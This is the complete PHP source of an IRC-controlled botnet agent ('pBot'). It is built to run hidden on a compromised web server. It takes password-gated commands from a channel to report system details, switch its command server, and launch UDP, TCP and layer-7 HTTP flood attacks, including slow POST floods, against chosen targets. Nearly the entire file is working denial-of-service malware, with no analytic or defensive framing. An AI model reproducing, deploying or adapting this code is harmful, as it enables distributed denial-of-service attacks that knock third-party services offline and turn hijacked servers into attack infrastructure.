<?php
set_time_limit(0); 
error_reporting(0);
ignore_user_abort(true);
$uname= @php_uname();
$joinchans = 0;
function isCurl(){
    return function_exists('curl_version');
}
$user_agents = array(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17",
        "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
        "Mozilla/5.0 (Windows NT 6.1; rv:15.0) Gecko/20120716 Firefox/15.0a2",
        "Mozilla/5.0 (Windows NT 5.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
        "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
        "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)",
        "Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00"
    );
class pBot
{
 public $charset = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
 var $config = array("server"=>"", "port"=>"", "key"=>"", "prefix"=>"", "maxrand"=>"5", "chan"=>"#private1", "trigger"=>"", "password"=>"", "auth"=>"crab.net");
 var $users = array();
 function start() {
    while(true)
	{
	    if(!($this->conn = fsockopen($this->config['server'],$this->config['port'],$e,$s,30))) $this->start(); 
	    $ident = $this->config['prefix'];
	    $ident123123 = substr(str_shuffle("ABCDEFGHIJKLMNOPQRSTUVWXYZ"), 0, 7);
	    $ident .= $ident123123;
	    $this->send("USER ".$ident." 127.0.0.1 localhost : ".$ident);
	    $this->set_nick();
	    $this->main();
	    sleep(5);
	}
}
 function main()
 {
    while(!feof($this->conn))
    {
	if(function_exists('stream_select'))
	{
		$read = array($this->conn);
		$write = NULL;
		$except = NULL;
		$changed = stream_select($read, $write, $except, 30);
		if($changed == 0)
		{
			fwrite($this->conn, "PING :lelcomeatme\r\n");
			$read = array($this->conn);
				$write = NULL;
				$except = NULL;
				$changed = stream_select($read, $write, $except, 30);
			if($changed == 0) break;
		}
	}
       $this->buf = trim(fgets($this->conn,512)); 
       $cmd = explode(" ",$this->buf); 
       if(substr($this->buf,0,6)=="PING :") { $this->send("PONG :".substr($this->buf,6)); continue; }
       if(isset($cmd[1]) && $cmd[1] =="001") { $this->join($this->config['chan'],$this->config['key']); $this->joinpriv2(); continue; } 
       if(isset($cmd[1]) && $cmd[1]=="433") { $this->set_nick(); continue; }
       if($this->buf != $old_buf) 
       { 
          $mcmd = array(); 
          $msg = substr(strstr($this->buf," :"),2); 
          $msgcmd = explode(" ",$msg); 
          $nick = explode("!",$cmd[0]); 
          $vhost = explode("@",$nick[1]); 
          $vhost = $vhost[1]; 
          $nick = substr($nick[0],1); 
          $host = $cmd[0]; 
          if($msgcmd[0]==$this->nick) for($i=0;$i<count($msgcmd);$i++) $mcmd[$i] = $msgcmd[$i+1];
          else for($i=0;$i<count($msgcmd);$i++) $mcmd[$i] = $msgcmd[$i];

          if(count($cmd)>2) 
          { 
             switch($cmd[1]) 
             {
                case "PRIVMSG": 
                   if(true) 
                   {
                      if(substr($mcmd[0],0,1)=="!") 
                      { 
                         switch(substr($mcmd[0],1)) 
                         {
                            case "uname":
                               if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") { $safemode = "on"; }
                               else { $safemode = "off"; }
							   if($mcmd[1] == "yolo420")
							   {
							    $uname = php_uname();
								$this->privmsg($this->config['chan'],"[\2info\2]: ".$uname." (safe: ".$safemode.")");
							   }
                            break;
                            case "ud.server": 
                               if(count($mcmd)>3) 
                               { 
						        if($mcmd[3] == "420yolo")
								{
                                  $this->config['server'] = $mcmd[1]; 
                                  $this->config['port'] = $mcmd[2];
                                  if(isset($mcmcd[3])) 
                                  { 
                                   $this->config['pass'] = $mcmd[4]; 
                                   $this->privmsg($this->config['chan'],"[\2update\2]: info updated ".$mcmd[1].":".$mcmd[2]." pass: ".$mcmd[4]); 
                                  } 
                                  else 
                                  { 
                                     $this->privmsg($this->config['chan'],"[\2update\2]: switched server to ".$mcmd[1].":".$mcmd[2]); 
                                  }
								fclose($this->conn);	
								}
                              } 
                            break; 
							case "joinchannel": 
                               if(count($mcmd)>1) 
                               { 
									$this->privmsg($this->config['chan'],"[\2update\2]: switched channel to ".$mcmd[1]); 
									$this->join($mcmd[1]); 				
                               } 
                            break; 
							case "killall":
								if ($mcmd[1] == "drakelikesdogsinhismouth")
								{
									exit();
									fclose($this->conn);
								}
							break;
                            case "udp": 
                               if(count($mcmd)>4) { $this->udpflood($mcmd[1],$mcmd[2],$mcmd[3],$mcmd[4]); } 
                            break; 
                            case "tcp": 
                               if(count($mcmd)>3) { $this->tcpflood($mcmd[1],$mcmd[2],$mcmd[3]); } 
                            break;
							case "l7":
								if (count($mcmd) > 3) {
									switch($mcmd[1]){
										case 'get':
											if(isset($mcmd[4])) {
												$this->attack_http("GET", $mcmd[2], $mcmd[3], $mcmd[4]);
											} else {
												$this->attack_http("GET", $mcmd[2], $mcmd[3]);
											}
										break;										
										case 'post':
											$this->attack_post($mcmd[2], $mcmd[3]);
										break;										
										case 'head':
											$this->attack_http("HEAD", $mcmd[2], $mcmd[3]);
										break;
									}
                                }
                            break;
							case "curl":
							if(isCurl()) {
								$this->privmsg($this->config['chan'],"Yes");
							}else{
								$this->privmsg($this->config['chan'],"No");
							}
							break;
							case "version":
								$this->privmsg($this->config['chan'],"2.9995");
							break;
                         } 
                      } 
                   } 
                break; 
             } 
          } 
       }
    } 
 } 
 function send($msg) { fwrite($this->conn,$msg."\r\n"); } 
 function join($chan,$key=NULL) { $this->send("JOIN ".$chan." ".$key); } 
 function joinpriv2(){
	if($joinchans == 1 && time() >= $lastrun + 300)
	{
		return false;
	}
	$this->join("#b");
	$chance123 = substr(str_shuffle("123456789ABCDEFGHIJK"), 0, 1);
	$priv2list = "A L";
	$explodepriv2list = explode(' ', $priv2list);
	$priv3list = "1 2 3 4 5 6 7";
	$explodepriv3list = explode(' ', $priv3list);
	$priv4list = "8 9 G H I J K";
	$explodepriv4list = explode(' ', $priv4list);
	if(isCurl()) {
		$this->join("#k");
	}
	foreach($explodepriv3list as $ilikecats)
	{
		if(preg_match("/".$ilikecats."/", $chance123))
		{
			$this->join("#private3");
		}
	}
	foreach($explodepriv4list as $ilikedingling)
	{
		if(preg_match("/".$ilikedingling."/", $chance123))
		{
			$this->join("#private4");
		}
	}
	foreach($explodepriv2list as $ilikedogs)
	{
		if(preg_match("/".$ilikedogs."/", $chance123))
		{
			$this->join("#private2");
		}
	}
	$joinchans = 1;
	$lastrun = time() + 1;
	
 }
 function privmsg($to,$msg) { $this->send("PRIVMSG ".$to." :".$msg); }
 function notice($to,$msg) { $this->send("NOTICE ".$to." :".$msg); }
 function set_nick()
 {
	$nick123 = substr(str_shuffle("ABCDEFGHIJKLMNOPQRSTUVWXYZ"), 0, $this->config['maxrand']);
    $this->nick = "";
	$this->nick .= $nick123;
    $this->send("NICK ".$this->nick);
 } 
  function udpflood($host,$port,$time,$packetsize) { 
	$packet = "";
	$timetorepeat = $packetsize / 64;
	$timetorepeat = round($timetorepeat + 1.5);
	$string = str_repeat("01234defghJKLMNOPQ56789abcipqRSTUVrstuvwxyzABCDEFGjklmnoHIWXYZ", $timetorepeat);
	$packet .= substr(str_shuffle($string), 0, $packetsize);
	$end = time() + $time;
	$multitarget = false;
	if($time > 300)
	{
	     $this->privmsg($this->config['chan'],"[\2Max Time Exceeded!\2]");
	     return false;
	}
	$this->privmsg($this->config['chan'],"[\2UdpFlood Started!\2]");
	if(strpos($host, ",") !== FALSE)
	{
		$multitarget = true;
		$host = explode(",", $host);
	}
	$i = 0;
	if($multitarget)
	{
		$fp = array();
		foreach($host as $hostt) $fp[] = fsockopen("udp://".$hostt,$port,$e,$s,5);

		$count = count($host);
		while(true)
		{
      			fwrite($fp[$i % $count],$packet);
			fflush($fp[$i % $count]);
			if($i % 100 == 0)
			{
				if($end < time()) break;
			}
			$i++;
		}

       		foreach($fp as $fpp) fclose($fpp);
	} else {
		$fp = fsockopen("udp://".$host,$port,$e,$s,5);
		while(true)
		{
      			fwrite($fp,$packet);
			fflush($fp);
			if($i % 100 == 0)
			{
				if($end < time()) break;
			}
			$i++;
		}
       		fclose($fp);
	}
	$env = $i * $packetsize;
	$env = $env / 1048576;
	$vel = $env / $time;
	$vel = round($vel);
	$env = round($env);
	$pps = $i;
	$pps = $pps / $time;
	$pps = round($pps);
	$this->privmsg($this->config['chan'],"[\2UdpFlood Finished!\2]: ".$env." MB sent / Average: ".$vel." MB/s PPS: ".$pps."");
}
	function tcpflood($host, $port, $time) {
        $this->privmsg($this->config['chan'], "[\2TCP Started!\2]");
        $timei    = time();
        $packet = "";
        for ($i = 0; $i < 65000; $i++) {
            $packet .= $this->charset[rand(0, strlen($this->charset))];
        }
        while (time() - $timei < $time) {
            $handle = fsockopen("tcp://".$host, $port, $errno, $errstr, 1);
            fwrite($handle, $packet);
        }
        $this->privmsg($this->config['chan'], "[\2TCP Finished!\2]");
    }
	function attack_http($mthd, $server, $time, $url='/') {
        $timei = time();
        $fs    = array();
        $this->privmsg($this->config['chan'], "[\2Layer 7 {$mthd}$url Attack Started On : $server!\2]");
        $request = "$mthd $url HTTP/1.1\r\n";
        $request .= "Host: $server\r\n";
        $request .= "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16\r\n";
        $request .= "Keep-Alive: $time\r\n";
        $request .= "Accept: *.*\r\n\r\n";
        $timei = time();
        for ($i = 0; $i < 100; $i++) {
            $fs[$i] = @fsockopen($server, 80, $errno, $errstr);
        }
        while ((time() - $timei < $time)) {
            for ($i = 0; $i < 100; $i++) {
                if (@fwrite($fs[$i], $request)) {
                    continue;
                } else {
                    $fs[$i] = @fsockopen($server, 80, $errno, $errstr);
                }
            }
        }
        $this->privmsg($this->config['chan'], "[\2Layer 7 {$mthd} Attack Finished!\2]");
    }
    function attack_post($server, $time) {
        $timei = time();
        $fs    = array();
        $this->privmsg($this->config['chan'], "[\2Layer 7 Post Attack Started On : $server!\2]");
        $request = "POST /" . md5(rand()) . " HTTP/1.1\r\n";
        $request .= "Host: $server\r\n";
        $request .= "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16\r\n";
        $request .= "Keep-Alive: $time\r\n";
        $request .= "Content-Length: 1000000000\r\n";
        $request .= "Content-Type: application/x-www-form-urlencoded\r\n";
        $request .= "Accept: *.*\r\n\r\n";
        for ($i = 0; $i < 100; $i++) {
            $fs[$i] = @fsockopen($server, 80, $errno, $errstr);
        }
        while ((time() - $timei < $time)) {
            for ($i = 0; $i < 100; $i++) {
                if (@fwrite($fs[$i], $request)) {
                    continue;
                } else {
                    $fs[$i] = @fsockopen($server, 80, $errno, $errstr);
                }
            }
        }
        fclose($sockfd);
        $this->privmsg($this->config['chan'], "[\2Layer 7 Post Attack Finished!\2]");
    }
} 
$bot = new pBot; 
$bot->start(); 
?>
